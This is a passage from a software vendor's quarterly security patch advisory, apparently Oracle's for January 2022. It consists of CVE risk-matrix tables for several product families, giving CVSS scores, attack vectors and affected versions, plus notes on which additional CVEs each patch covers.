| CVE-2020-17527 | Oracle Communications Cloud Native Core Policy | Policy (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.14.0 |  |
| CVE-2021-28165 | Oracle Communications Cloud Native Core Policy | Policy (Eclipse Jetty) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-22119 | Oracle Communications Cloud Native Core Policy | Policy (Spring Security) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2020-28469 | Oracle Communications Cloud Native Core Policy | Policy (glob-parent) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-25122 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 1.6.0 |  |
| CVE-2021-36090 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-36090 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-37137 | Oracle Communications Diameter Signaling Router | API Gateway (Netty) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.0.0-8.5.0.2 |  |
| CVE-2021-42340 | Oracle Communications Diameter Signaling Router | Platform (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.0.0.0-8.5.0.2 |  |
| CVE-2021-42340 | Oracle SD-WAN Edge | Management (Apache Tomcat) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 9.0, 9.1 |  |
| CVE-2021-23337 | Oracle Communications Cloud Native Core Binding Support Function | Binding Support Function (Lodash) | HTTP | No | 7.2 | Network | Low | High | None | Un- changed | High | High | High | 1.9.0 |  |
| CVE-2022-21395 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 7.2 | Network | Low | High | None | Un- changed | High | High | High | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2021-23337 | Oracle Communications Services Gatekeeper | Policy service (Lodash) | HTTP | No | 7.2 | Network | Low | High | None | Un- changed | High | High | High | 7.0 |  |
| CVE-2021-21703 | Oracle Communications Diameter Signaling Router | Platform (PHP) | None | No | 7.0 | Local | High | Low | None | Un- changed | High | High | High | 8.0.0.0-8.5.0.2 |  |
| CVE-2021-44832 | Oracle Communications Diameter Signaling Router | Virtual Network Function Manager, API Gateway (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 8.3.0.0-8.5.1.0 | See Note 1 |
| CVE-2021-44832 | Oracle Communications Interactive Session Recorder | RSS (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 6.3, 6.4 | See Note 1 |
| CVE-2022-21399 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 6.6 | Network | Low | High | None | Changed | Low | Low | Low | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2022-21401 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 6.6 | Network | Low | High | None | Changed | Low | Low | Low | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2022-21403 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 6.6 | Network | Low | High | None | Changed | Low | Low | Low | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2022-21381 | Oracle Enterprise Session Border Controller | WebUI | HTTP | No | 6.4 | Network | Low | Low | None | Changed | Low | Low | None | 8.4, 9.0 |  |
| CVE-2020-11022 | Oracle Communications EAGLE Application Processor | Platform (jQuery) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 16.1-16.4 |  |
| CVE-2020-11022 | Oracle Communications Services Gatekeeper | API Portal (jQuery) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 7.0 |  |
| CVE-2021-21409 | Oracle Communications Cloud Native Core Console | Console (Netty) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | High | None | 1.7.0 |  |
| CVE-2020-14340 | Oracle Communications Cloud Native Core Network Repository Function | Network Repository Function (XNIO) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2020-14340 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (XNIO) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.15.0 |  |
| CVE-2021-33880 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (aaugustin websockets) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 1.5.0 |  |
| CVE-2021-3326 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (glibc) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.5.0 |  |
| CVE-2020-14340 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (XNIO) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-33880 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (aaugustin websockets) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 1.14.0 |  |
| CVE-2020-14340 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (XNIO) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2021-33880 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (aaugustin websockets) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 1.14.0 |  |
| CVE-2021-45105 | Oracle Communications Service Broker | Integration (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 6.2 | See Note 1 |
| CVE-2021-45105 | Oracle Communications Services Gatekeeper | API Portal (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 7.0 | See Note 1 |
| CVE-2021-45105 | Oracle Communications WebRTC Session Controller | Signaling Engine, Media Engine (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 7.2.0, 7.2.1 | See Note 1 |
| CVE-2021-3426 | Oracle Communications Cloud Native Core Binding Support Function | Binding Support Function (Python) | Multiple | No | 5.7 | Adjacent Network | Low | Low | None | Un- changed | High | None | None | 1.10.0 |  |
| CVE-2021-23017 | Oracle Communications Session Border Controller | Routing (nginx) | HTTP | Yes | 5.6 | Network | High | None | None | Un- changed | Low | Low | Low | 8.4, 9.0 |  |
| CVE-2021-23017 | Oracle Enterprise Communications Broker | Routing (nginx) | HTTP | Yes | 5.6 | Network | High | None | None | Un- changed | Low | Low | Low | 3.3 |  |
| CVE-2021-23017 | Oracle Enterprise Session Border Controller | Routing (nginx) | HTTP | Yes | 5.6 | Network | High | None | None | Un- changed | Low | Low | Low | 8.4, 9.0 |  |
| CVE-2020-27618 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (glibc) | None | No | 5.5 | Local | Low | Low | None | Un- changed | None | None | High | 1.14.0 |  |
| CVE-2022-21246 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2022-21396 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2022-21397 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2022-21398 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2022-21400 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2021-34429 | Oracle Communications Cloud Native Core Binding Support Function | Binding Support Function (Eclipse Jetty) | TCP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 1.10.0 |  |
| CVE-2021-34429 | Oracle Communications Cloud Native Core Security Edge Protection Proxy | SEPP (Eclipse Jetty) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 1.5.0 |  |
| CVE-2020-13956 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Apache HttpClient) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 1.14.0 |  |
| CVE-2021-33037 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Apache Tomcat) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 1.14.0 |  |
| CVE-2021-34429 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Eclipse Jetty) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 1.14.0 |  |
| CVE-2020-29582 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Kotlin) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 1.14.0 |  |
| CVE-2021-34429 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Eclipse Jetty) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 1.14.0 |  |
| CVE-2021-34429 | Oracle Communications Diameter Signaling Router | API Gateway (Eclipse Jetty) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | Low | None | None | 8.0.0.0-8.5.0.2 |  |
| CVE-2021-21705 | Oracle SD-WAN Aware | Management (PHP) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 8.2 |  |
| CVE-2020-8554 | Oracle Communications Cloud Native Core Service Communication Proxy | SCP (Kubernetes API) | HTTP | No | 5.0 | Network | High | Low | None | Un- changed | Low | Low | Low | 1.14.0 |  |
| CVE-2020-8554 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Kubernetes API) | HTTP | No | 5.0 | Network | High | Low | None | Un- changed | Low | Low | Low | 1.14.0 |  |
| CVE-2021-29921 | Oracle Communications Cloud Native Core Automated Test Suite | ATS Framework (Python) | HTTP | No | 4.9 | Network | Low | High | None | Un- changed | None | High | None | 1.8.0 |  |
| CVE-2021-29425 | Oracle Communications Cloud Native Core Network Repository Function | NRF (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 1.14.0 |  |
| CVE-2021-29425 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 1.14.0 |  |
| CVE-2022-21402 | Oracle Communications Operations Monitor | Mediation Engine | HTTP | No | 4.8 | Network | Low | High | Required | Changed | Low | Low | None | 3.4, 4.2, 4.3, 4.4, 5.0 |  |
| CVE-2022-21383 | Oracle Enterprise Session Border Controller | Log | HTTP | No | 4.3 | Network | Low | Low | None | Un- changed | None | None | Low | 8.4, 9.0 |  |
| CVE-2021-3448 | Oracle Communications Cloud Native Core Network Function Cloud Native Environment | Configuration (dnsmasq) | TCP | Yes | 4.0 | Network | High | None | None | Changed | None | Low | None | 1.9.0 |  |
| CVE-2020-8908 | Oracle Communications Cloud Native Core Unified Data Repository | UDR (Guava) | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 1.14.0 |  |

#### Notes:

1. This patch also addresses vulnerabilities CVE-2021-44228 and CVE-2021-45046. Customers need not apply the patches/mitigations of Security Alert CVE-2021-44228 and CVE-2021-45046 for this product.

#### Additional CVEs addressed are:

* The patch for CVE-2020-10878 also addresses CVE-2020-10543 and CVE-2020-12723.
* The patch for CVE-2020-11022 also addresses CVE-2019-11358 and CVE-2020-11023.
* The patch for CVE-2020-17527 also addresses CVE-2020-13934, CVE-2020-13935, CVE-2020-9484, CVE-2021-25122, CVE-2021-25329, CVE-2021-30369, CVE-2021-30640 and CVE-2021-33037.
* The patch for CVE-2020-36189 also addresses CVE-2020-35490, CVE-2020-35491, CVE-2020-35728, CVE-2020-36179, CVE-2020-36180, CVE-2020-36181, CVE-2020-36182, CVE-2020-36183, CVE-2020-36184, CVE-2020-36185, CVE-2020-36186, CVE-2020-36187 and CVE-2020-36188.
* The patch for CVE-2021-23337 also addresses CVE-2020-28500.
* The patch for CVE-2021-25122 also addresses CVE-2021-25329.
* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.
* The patch for CVE-2021-37137 also addresses CVE-2021-37136.
* The patch for CVE-2021-39139 also addresses CVE-2021-39140, CVE-2021-39141, CVE-2021-39144, CVE-2021-39145, CVE-2021-39146, CVE-2021-39147, CVE-2021-39148, CVE-2021-39149, CVE-2021-39150, CVE-2021-39151, CVE-2021-39152, CVE-2021-39153 and CVE-2021-39154.
* The patch for CVE-2021-39153 also addresses CVE-2021-39139, CVE-2021-39141, CVE-2021-39144, CVE-2021-39145, CVE-2021-39146, CVE-2021-39147, CVE-2021-39148, CVE-2021-39149, CVE-2021-39150, CVE-2021-39151, CVE-2021-39152 and CVE-2021-39154.
* The patch for CVE-2021-42340 also addresses CVE-2021-33037.
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle Communications Cloud Native Core Network Repository Function
  + NRF (Apache Commons Compress): CVE-2021-36090, CVE-2021-35515, CVE-2021-35516 and CVE-2021-35517.

#### Oracle Construction and Engineering Risk Matrix

This Critical Patch Update contains 22 new security patches for Oracle Construction and Engineering.  15 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#PVA)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-44790 | Instantis EnterpriseTrack | Core (Apache HTTP Server) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 17.1, 17.2, 17.3 |  |
| CVE-2021-42575 | Primavera Unifier | Platform, Data Persistence (OWASP Java HTML Sanitizer) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 17.7-17.12, 18.8, 19.12, 20.12, 21.12 |  |
| CVE-2021-2351 | Primavera Analytics | ETL (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 18.8.3.3, 19.12.11.1, 20.12.12.0 |  |
| CVE-2021-2351 | Primavera Data Warehouse | ETL (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 18.8.3.3, 19.12.11.1, 20.12.12.0 |  |
| CVE-2021-2351 | Primavera P6 Enterprise Project Portfolio Management | Web Access (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 17.12.0.0-17.12.20.0, 18.8.0.0-18.8.24.0, 19.12.0.0-19.12.17.0, 20.12.0.0-20.12.9.0 |  |
| CVE-2021-2351 | Primavera P6 Professional Project Management | API component of P6 Pro (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 17.12.0.0-17.12.20.0, 18.8.0.0-18.8.24.0, 19.12.0.0-19.12.17.0, 20.12.0.0-20.12.9.0 |  |
| CVE-2021-2351 | Primavera Unifier | Platform,Data Access,Data Persistence (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 17.7-17.12, 18.8, 19.12, 20.12, 21.12 |  |
| CVE-2021-37714 | Primavera Unifier | Platform,Data Parsing (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 20.12, 21.12 |  |
| CVE-2021-44832 | Primavera Gateway | Admin (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 17.12.0-17.12.11, 18.8.0-18.8.13, 19.12.0-19.12.12, 20.12.0-20.12.7, 21.12.0 | See Note 1 |
| CVE-2021-44832 | Primavera P6 Enterprise Project Portfolio Management | Web Access (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 19.12.0.0-19.12.18.0, 20.12.0.0-20.12.12.0, 21.12.0.0 | See Note 1 |
| CVE-2021-44832 | Primavera Unifier | Logging (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 18.8, 19.12, 20.12, 21.12 | See Note 1 |
| CVE-2022-21269 | Primavera Portfolio Management | Web Access | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 18.0.0.0-18.0.3.0, 19.0.0.0-19.0.1.2, 20.0.0.0, 20.0.0.1 |  |
| CVE-2021-45105 | Instantis EnterpriseTrack | Logging (Apache Log4j) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | None | None | High | 17.1, 17.2, 17.3 | See Note 1 |
| CVE-2021-38153 | Primavera Unifier | Event Streams and Communications (Apache Kafka) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 18.8, 19.12, 20.12, 21.12 |  |
| CVE-2022-21377 | Primavera Portfolio Management | Web API | HTTP | Yes | 5.4 | Network | Low | None | Required | Un- changed | Low | Low | None | 18.0.0.0-18.0.3.0, 19.0.0.0-19.0.1.2, 20.0.0.0 |  |
| CVE-2022-21242 | Primavera Portfolio Management | Web Access | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 18.0.0.0-18.0.3.0, 19.0.0.0-19.0.1.2, 20.0.0.0, 20.0.0.1 |  |
| CVE-2022-21376 | Primavera Portfolio Management | Web Access | HTTP | Yes | 5.4 | Network | Low | None | Required | Un- changed | Low | Low | None | 18.0.0.0-18.0.3.0, 19.0.0.0-19.0.1.2, 20.0.0.0 |  |
| CVE-2022-21281 | Primavera Portfolio Management | Web Access | HTTP | No | 4.8 | Network | Low | High | Required | Changed | Low | Low | None | 18.0.0.0-18.0.3.0, 19.0.0.0-19.0.1.2, 20.0.0.0, 20.0.0.1 |  |
| CVE-2021-29425 | Primavera Unifier | Platform (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 17.7-17.12, 18.8, 19.12, 20.12, 21.12 |  |
| CVE-2022-21243 | Primavera Portfolio Management | Web Access | HTTP | No | 4.3 | Network | Low | Low | None | Un- changed | None | None | Low | 18.0.0.0-18.0.3.0, 19.0.0.0-19.0.1.2, 20.0.0.0, 20.0.0.1 |  |
| CVE-2022-21244 | Primavera Portfolio Management | Web Access | HTTP | Yes | 4.3 | Network | Low | None | Required | Un- changed | None | Low | None | 18.0.0.0-18.0.3.0, 19.0.0.0-19.0.1.2, 20.0.0.0, 20.0.0.1 |  |
| CVE-2020-8908 | Primavera Unifier | Data Service (Guava) | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 17.7-17.12, 18.8, 19.12, 20.12, 21.12 |  |

#### Notes:

1. This patch also addresses vulnerabilities CVE-2021-44228 and CVE-2021-45046. Customers need not apply the patches/mitigations of Security Alert CVE-2021-44228 and CVE-2021-45046 for this product.

#### Additional CVEs addressed are:

* The patch for CVE-2021-44790 also addresses CVE-2021-33193, CVE-2021-34798, CVE-2021-36160, CVE-2021-39275, CVE-2021-40438, CVE-2021-41524, CVE-2021-41773, CVE-2021-42013 and CVE-2021-44224.
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.

#### Oracle E-Business Suite Risk Matrix

This Critical Patch Update contains 9 new security patches for Oracle E-Business Suite.  5 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#EBS)

Oracle E-Business Suite products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle E-Business Suite products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security updates are not listed in the Oracle E-Business Suite risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle E-Business Suite products, Oracle recommends that customers apply the January 2022 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Oracle E-Business Suite. For information on what patches need to be applied to your environments, refer to Oracle E-Business Suite Release 12 Critical Patch Update Knowledge Document (January 2022), [My Oracle Support Note 2484000.1](https://support.oracle.com/rs?type=doc&id=2484000.1).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-21255 | Oracle Configurator | UI Servlet | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 12.2.3-12.2.11 |  |
| CVE-2022-21273 | Oracle Project Costing | Expenses, Currency Override | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 12.2.3-12.2.11 |  |
| CVE-2022-21274 | Oracle Sourcing | Intelligence, RFx Creation | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 12.2.3-12.2.11 |  |
| CVE-2022-21250 | Oracle Trade Management | GL Accounts | HTTP | No | 8.1 | Network | Low | Low | None | Un- changed | High | High | None | 12.2.3-12.2.11 |  |
| CVE-2022-21251 | Oracle Installed Base | Instance Main | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.3-12.2.11 |  |
| CVE-2019-10086 | Oracle Time and Labor | Timecard (Apache Commons Beanutils) | HTTP | Yes | 7.3 | Network | Low | None | None | Un- changed | Low | Low | Low | 12.2.6-12.2.11 |  |
| CVE-2020-6950 | Oracle Time and Labor | Timecard (Eclipse Mojarra) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | High | None | None | 12.2.6-12.2.11 |  |
| CVE-2022-21354 | Oracle iStore | User Interface | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.3-12.2.11 |  |
| CVE-2022-21373 | Oracle Partner Management | Reseller Locator | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.3-12.2.11 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2020-6950 also addresses CVE-2019-17091.

#### Oracle Enterprise Manager Risk Matrix

This Critical Patch Update contains 7 new security patches for Oracle Enterprise Manager.  6 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  None of these patches are applicable to client-only installations, i.e., installations that do not have Oracle Enterprise Manager installed. The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#EM)

Oracle Enterprise Manager products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle Enterprise Manager products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security updates are not listed in the Oracle Enterprise Manager risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle Enterprise Manager products, Oracle recommends that customers apply the January 2022 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Enterprise Manager. For information on what patches need to be applied to your environments, refer to Critical Patch Update January 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2817011.1](https://support.oracle.com/rs?type=doc&id=2817011.1).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-3177 | Enterprise Manager Ops Center | Networking (Python) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.4.0.0 |  |
| CVE-2022-21392 | Enterprise Manager Base Platform | Policy Framework | None | No | 8.8 | Local | Low | Low | None | changed | High | High | High | 13.4.0.0, 13.5.0.0 |  |
| CVE-2021-2351 | Application Performance Management | End User Experience Management (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 13.4.1.0, 13.5.1.0 |  |
| CVE-2021-2351 | Enterprise Manager Base Platform | Enterprise Manager Install (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 13.4.0.0, 13.5.0.0 |  |
| CVE-2021-2351 | Enterprise Manager Ops Center | Networking (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.4.0.0 |  |
| CVE-2021-2351 | Oracle Application Testing Suite | Load Testing for Web Apps (JDBC, OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 13.3.0.1 |  |
| CVE-2021-2351 | Oracle Real User Experience Insight | End User Experience Management (OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 13.4.1.0, 13.5.1.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-3177 also addresses CVE-2021-23336.

#### Oracle Financial Services Applications Risk Matrix

This Critical Patch Update contains 48 new security patches for Oracle Financial Services Applications.  37 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpujan2022verbose.html#IFLX)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2019-17495 | Oracle Banking APIs | Framework (Swagger UI) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2019-17495 | Oracle Banking Digital Experience | Framework (Swagger UI) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2020-13936 | Oracle Banking Deposits and Lines of Credit Servicing | Web UI (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 2.12.0 |  |
| CVE-2020-13936 | Oracle Banking Enterprise Default Management | Collections (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 2.3.0-2.4.1, 2.6.2, 2.7.1, 2.10.0, 2.12.0 |  |
| CVE-2020-13936 | Oracle Banking Loans Servicing | Web UI (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 2.12.0 |  |
| CVE-2020-13936 | Oracle Banking Party Management | Web UI (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 2.7.0 |  |
| CVE-2020-13936 | Oracle Banking Platform | Security (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 2.3.0-2.4.1, 2.6.2, 2.7.1 |  |
| CVE-2021-2351 | Oracle Banking APIs | Framework (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-2351 | Oracle Banking Digital Experience | Framework (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 17.2, 18.1-18.3, 19.1, 19.2, 20.1, 21.1 |  |
| CVE-2021-2351 | Oracle Financial Services Analytical Applications Infrastructure | Rate Management (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.7-8.1.1 |  |
| CVE-2021-2351 | Oracle Financial Services Behavior Detection Platform | Third Party (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.7, 8.0.8, 8.1.1 |  |
| CVE-2021-2351 | Oracle Financial Services Enterprise Case Management | Installers (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.7, 8.0.8, 8.1.1 |  |
| CVE-2021-2351 | Oracle Financial Services Foreign Account Tax Compliance Act Management | Installation (JDBC) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 8.0.7, 8.0.8, 8.1.1 |  |
